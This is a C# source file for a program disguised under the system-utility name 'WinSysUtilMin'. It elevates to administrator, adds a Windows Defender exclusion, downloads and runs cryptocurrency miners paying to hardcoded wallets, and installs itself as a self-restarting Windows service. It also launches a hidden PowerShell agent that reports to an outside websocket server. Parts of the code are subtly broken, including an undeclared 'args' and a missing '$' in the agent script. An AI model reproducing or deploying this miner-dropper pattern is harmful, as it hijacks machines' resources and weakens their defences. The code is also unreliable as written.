namespace WinSysUtil
{ 
    using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Script.Serialization;

public class WinSysUtilMin : ServiceBase
{
    const string Root = @"C:\WinSysUtilMin";
    const string SvcName = "WinSysUtilMin";
    const string SvcDisp = "WinSysUtilMin";
    const string XMR = "42JmawsYfjzXdyBC5gz3TxUBqhWEfazKd936yZdix6MQ5DeCo1krRNdKsRvQMLoFEN6KKn8zsk3X3i37WbiwrAeZFV7yazY";
    const string XEL = "xel:lglj7ldyjxn835u09xz5rg99lzhhcdvj077wr7s6qf6a24ylqc0sqluua7k";
    const string XelPool = "xel-us.kryptex.network:7019";
    const string Server = "ws://fleetboard.nullsect0r.dev/ws/agent";
    const string Token = "c814d492d3f3799ef04b8fd2573702a04bd3d6e0d85af5404658a162cd1f594b";
    const string Sidechain = "--nano";

    public static void DoTheThing()
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

        if (args.Length > 0 && string.Equals(args[0], "service", StringComparison.OrdinalIgnoreCase))
        {
            ServiceBase.Run(new WinSysUtilMin());
            return;
        }

        try { RunSetup(); }
        catch (Exception e)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("ERROR: " + e.Message);
            Console.ResetColor();
            Environment.ExitCode = 1;
        }

        if (Environment.UserInteractive)
        {
            Console.WriteLine();
            Console.WriteLine("Done. Press any key to close.");
            try { Console.ReadKey(); } catch { }
        }
    }

    static void Say(string m)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("==> " + m);
        Console.ResetColor();
    }

    static bool IsAdmin()
    {
        using (var id = WindowsIdentity.GetCurrent())
            return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
    }

    static string SelfPath()
    {
        return Process.GetCurrentProcess().MainModule.FileName;
    }

    static void RunSetup()
    {
        if (!IsAdmin())
        {
            Say("relaunching as administrator...");
            var psi = new ProcessStartInfo(SelfPath()) { UseShellExecute = true, Verb = "runas" };
            try { Process.Start(psi); } catch { Console.WriteLine("elevation declined."); }
            Environment.Exit(0);
        }

        Directory.CreateDirectory(Root);
        Directory.CreateDirectory(Path.Combine(Root, "p2pool-api"));

        try { Shell("powershell.exe", "-NoProfile -Command \"Add-MpPreference -ExclusionPath '" + Root + "'\"", false); Say("Defender exclusion added"); }
        catch { Console.WriteLine("!! add a Defender exclusion for " + Root + " if miners vanish"); }

        FetchZip(GetAsset("xmrig/xmrig", @"msvc-win64\.zip$"), Path.Combine(Root, "xmrig"));
        FetchZip(GetAsset("SChernykh/p2pool", @"windows-x64\.zip$"), Path.Combine(Root, "p2pool"));
        FetchZip(GetAsset("doktor83/SRBMiner-Multi", @"win64\.zip$"), Path.Combine(Root, "srbminer"));

        string xmrigExe = FindExe(Path.Combine(Root, "xmrig"), "xmrig.exe");
        string p2poolExe = FindExe(Path.Combine(Root, "p2pool"), "p2pool.exe");
        string srbExe = FindExe(Path.Combine(Root, "srbminer"), "SRBMiner-MULTI.exe");

        var gpus = GpuNames();
        bool hasNvidia = gpus.Exists(n => n.IndexOf("NVIDIA", StringComparison.OrdinalIgnoreCase) >= 0);
        Say("GPU: " + string.Join(", ", gpus.ToArray()));

        Say("testing Monero nodes");
        string nodeArgs = PickNodes();

        WriteAgent();

        var lines = new List<string>();
        lines.Add("p2pool|" + Path.Combine(Root, "p2pool") + "|" + p2poolExe +
                  "|--wallet " + XMR + " " + nodeArgs + " " + Sidechain +
                  " --local-api --data-api " + Path.Combine(Root, "p2pool-api"));
        lines.Add("xmrig|" + Path.Combine(Root, "xmrig") + "|" + xmrigExe +
                  "|-o 127.0.0.1:3333 -u x+50000 --http-host 127.0.0.1 --http-port 18088 --no-color");
        if (hasNvidia)
            lines.Add("srbminer|" + Path.Combine(Root, "srbminer") + "|" + srbExe +
                      "|--algorithm xelishashv3 --pool " + XelPool + " --wallet " + XEL + "/" + Environment.MachineName +
                      " --disable-cpu --disable-gpu-amd --disable-gpu-intel --api-enable --api-port 21550");
        lines.Add("agent|" + Root + "|powershell.exe|-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File " +
                  Path.Combine(Root, "fleet-agent.ps1"));
        File.WriteAllText(Path.Combine(Root, "miners.conf"), string.Join("\r\n", lines.ToArray()), new UTF8Encoding(false));
        Say("miners.conf: " + lines.Count + " processes");

        string destExe = Path.Combine(Root, "WinSysUtilMin.exe");
        if (ServiceExists(SvcName))
        {
            Shell("sc.exe", "stop " + SvcName, false);
            Shell("sc.exe", "delete " + SvcName, false);
            Thread.Sleep(2000);
        }
        if (!string.Equals(SelfPath(), destExe, StringComparison.OrdinalIgnoreCase))
            File.Copy(SelfPath(), destExe, true);

        Say("registering '" + SvcDisp + "'");
        Shell("sc.exe", "create " + SvcName + " binPath= \"" + destExe + " service\" start= auto DisplayName= \"" + SvcDisp + "\"", true);
        Shell("sc.exe", "description " + SvcName + " \"XMR+XEL miners and fleetboard agent\"", false);
        Shell("sc.exe", "failure " + SvcName + " reset= 86400 actions= restart/15000/restart/15000/restart/15000", false);
        Shell("sc.exe", "start " + SvcName, true);
        Thread.Sleep(3000);

        Say("service is " + ServiceStatus(SvcName) + "; reporting to the dashboard as '" + Environment.MachineName + "'");
        Console.WriteLine("  logs: " + Root + "  .  remove: sc stop " + SvcName + " ; sc delete " + SvcName);
    }

    static readonly JavaScriptSerializer Json = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };

    static string Http(string url)
    {
        using (var wc = new WebClient())
        {
            wc.Headers.Add("User-Agent", "WinSysUtilMin");
            return wc.DownloadString(url);
        }
    }

    static string GetAsset(string repo, string pattern)
    {
        var root = (Dictionary<string, object>)Json.DeserializeObject(Http("https://api.github.com/repos/" + repo + "/releases/latest"));
        var assets = (object[])root["assets"];
        var rx = new Regex(pattern, RegexOptions.IgnoreCase);
        foreach (var a in assets)
        {
            var d = (Dictionary<string, object>)a;
            string name = (string)d["name"];
            if (rx.IsMatch(name)) return (string)d["browser_download_url"];
        }
        throw new Exception("no asset matching /" + pattern + "/ in " + repo);
    }

    static void FetchZip(string url, string dest)
    {
        string zip = Path.Combine(Path.GetTempPath(), Path.GetFileName(url));
        Say("downloading " + Path.GetFileName(url));
        using (var wc = new WebClient())
        {
            wc.Headers.Add("User-Agent", "WinSysUtilMin");
            wc.DownloadFile(url, zip);
        }
        if (Directory.Exists(dest)) Directory.Delete(dest, true);
        Directory.CreateDirectory(dest);
        ZipFile.ExtractToDirectory(zip, dest);
        try { File.Delete(zip); } catch { }
    }

    static string FindExe(string dir, string name)
    {
        var hits = Directory.GetFiles(dir, name, SearchOption.AllDirectories);
        if (hits.Length == 0) throw new Exception(name + " not found under " + dir);
        return hits[0];
    }

    static List<string> GpuNames()
    {
        var names = new List<string>();
        try
        {
            using (var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController"))
                foreach (ManagementObject mo in s.Get())
                {
                    var n = mo["Name"];
                    if (n != null) names.Add(n.ToString());
                }
        }
        catch { }
        return names;
    }

    static string PickNodes()
    {
        string[] known = {
            "xmr.support:18081:18083",
            "p2pmd.xmrvsbeast.com:18081:18083",
            "node.sethforprivacy.com:18089:18083",
            "node2.monerodevs.org:18089:18084",
            "node3.monerodevs.org:18089:18084",
        };
        var good = new List<string>();
        foreach (var n in known)
        {
            if (good.Count >= 3) break;
            var p = n.Split(':');
            if (TestNode(p[0], int.Parse(p[1]), int.Parse(p[2]))) good.Add(n);
        }
        if (good.Count == 0) good.AddRange(new[] { known[0], known[1], known[2] });

        var parts = new List<string>();
        foreach (var n in good)
        {
            var q = n.Split(':');
            parts.Add("--host " + q[0] + " --rpc-port " + q[1] + " --zmq-port " + q[2]);
        }
        return string.Join(" ", parts.ToArray());
    }

    static bool TestNode(string host, int rpcPort, int zmqPort)
    {
        try
        {
            var req = (HttpWebRequest)WebRequest.Create("http://" + host + ":" + rpcPort + "/json_rpc");
            req.Method = "POST";
            req.ContentType = "application/json";
            req.Timeout = 4000;
            var body = Encoding.UTF8.GetBytes("{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"get_info\"}");
            using (var rs = req.GetRequestStream()) rs.Write(body, 0, body.Length);
            using (var resp = (HttpWebResponse)req.GetResponse())
            using (var sr = new StreamReader(resp.GetResponseStream()))
            {
                var root = (Dictionary<string, object>)Json.DeserializeObject(sr.ReadToEnd());
                var result = (Dictionary<string, object>)root["result"];
                if (!Convert.ToBoolean(result["synchronized"])) return false;
            }
            using (var tc = new TcpClient())
            {
                var ar = tc.BeginConnect(host, zmqPort, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(3000)) return false;
                tc.EndConnect(ar);
            }
            return true;
        }
        catch { return false; }
    }

    static void WriteAgent()
    {
        string agent = @"
$ErrorActionPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$Server='__SERVER__'; $Token='__TOKEN__'; $Name=$env:COMPUTERNAME
function Api($u){ try{ Invoke-RestMethod $u -TimeoutSec 2 }catch{ $null } }
while($true){
 try{
  $ws=New-Object System.Net.WebSockets.ClientWebSocket
  $ws.ConnectAsync([Uri]$Server,[Threading.CancellationToken]::None).Wait()
  while($ws.State -eq 'Open'){
    $miners=@()
    $x=Api 'http://127.0.0.1:18088/2/summary'
    if($x){ $t=$x.hashrate.total
      $miners+=@{source='xmrig';coin='XMR';summary=@{h10=$t[0];h60=$t[1];h15=$t[2];sharesGood=$x.results.shares_good;sharesRejected=($x.results.shares_total-$x.results.shares_good);device=""$($x.cpu.brand)""}} }
    $s=Api 'http://127.0.0.1:21550'
    if($s){ $g=$s.algorithms[0].hashrate.gpu.total; if(-not $g){$g=$s.algorithms[0].hashrate.total}
      $miners+=@{source='srbminer';coin='XEL';summary=@{h10=$g;h60=$g;h15=$g;sharesGood=$s.algorithms[0].shares.accepted;sharesRejected=$s.algorithms[0].shares.rejected;device='GPU'}} }
    $msg=@{token=$Token;name=$Name;ts=[int][double]::Parse((Get-Date -UFormat %s));miners=$miners} | ConvertTo-Json -Depth 6 -Compress
    $b=[Text.Encoding]::UTF8.GetBytes(msg)
    $ws.SendAsync((New-Object ArraySegment[byte] (,$b)),'Text',$true,[Threading.CancellationToken]::None).Wait()
    Start-Sleep 5
  }
 }catch{ Start-Sleep 10 }
 try{ $ws.Dispose() }catch{}
}";
        agent = agent.Replace("__SERVER__", Server).Replace("__TOKEN__", Token);
        File.WriteAllText(Path.Combine(Root, "fleet-agent.ps1"), agent, new UTF8Encoding(false));
    }

    static bool ServiceExists(string name)
    {
        foreach (var sc in ServiceController.GetServices())
            if (string.Equals(sc.ServiceName, name, StringComparison.OrdinalIgnoreCase)) return true;
        return false;
    }

    static string ServiceStatus(string name)
    {
        try { using (var sc = new ServiceController(name)) return sc.Status.ToString(); }
        catch { return "unknown"; }
    }

    static void Shell(string file, string args, bool check)
    {
        var psi = new ProcessStartInfo(file, args)
        {
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };
        using (var p = Process.Start(psi))
        {
            p.StandardOutput.ReadToEnd();
            p.StandardError.ReadToEnd();
            p.WaitForExit();
            if (check && p.ExitCode != 0) throw new Exception(file + " " + args + " -> exit " + p.ExitCode);
        }
    }

    Thread _mon;
    volatile bool _stop;
    readonly List<string[]> _specs = new List<string[]>();
    readonly Dictionary<string, Process> _procs = new Dictionary<string, Process>();
    readonly Dictionary<string, DateTime> _last = new Dictionary<string, DateTime>();
    string _dir;
    StreamWriter _log;

    public WinSysUtilMin()
    {
        ServiceName = SvcName;
        CanStop = true;
        CanShutdown = true;
    }

    void L(string s) { try { _log.WriteLine(DateTime.Now.ToString("s") + " " + s); _log.Flush(); } catch { } }

    protected override void OnStart(string[] args)
    {
        _dir = AppDomain.CurrentDomain.BaseDirectory;
        try { _log = new StreamWriter(Path.Combine(_dir, "service.log"), true); } catch { }
        LoadSpecs();
        _stop = false;
        _mon = new Thread(Loop) { IsBackground = true };
        _mon.Start();
    }

    void LoadSpecs()
    {
        _specs.Clear();
        string conf = Path.Combine(_dir, "miners.conf");
        if (!File.Exists(conf)) return;
        foreach (var raw in File.ReadAllLines(conf))
        {
            string ln = raw.Trim();
            if (ln.Length == 0 || ln.StartsWith("#")) continue;
            var p = ln.Split(new[] { '|' }, 4);
            if (p.Length < 4) continue;
            _specs.Add(p);
        }
    }

    void Loop()
    {
        while (!_stop)
        {
            foreach (var s in _specs)
            {
                if (_stop) break;
                Process cur;
                _procs.TryGetValue(s[0], out cur);
                bool alive = cur != null && !cur.HasExited;
                if (!alive)
                {
                    DateTime lt;
                    if (_last.TryGetValue(s[0], out lt) && (DateTime.Now - lt).TotalSeconds < 15) continue;
                    StartProc(s);
                }
            }
            Thread.Sleep(3000);
        }
    }

    void StartProc(string[] s)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = s[2],
                Arguments = s[3],
                WorkingDirectory = s[1],
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };
            _procs[s[0]] = Process.Start(psi);
            _last[s[0]] = DateTime.Now;
            L("start " + s[0]);
        }
        catch (Exception e)
        {
            _last[s[0]] = DateTime.Now;
            L("fail " + s[0] + ": " + e.Message);
        }
    }

    protected override void OnStop()
    {
        _stop = true;
        try { if (_mon != null) _mon.Join(5000); } catch { }
        foreach (var kv in _procs)
            try { if (kv.Value != null && !kv.Value.HasExited) kv.Value.Kill(); } catch { }
        try { if (_log != null) _log.Dispose(); } catch { }
    }

    protected override void OnShutdown() { OnStop(); }
}
}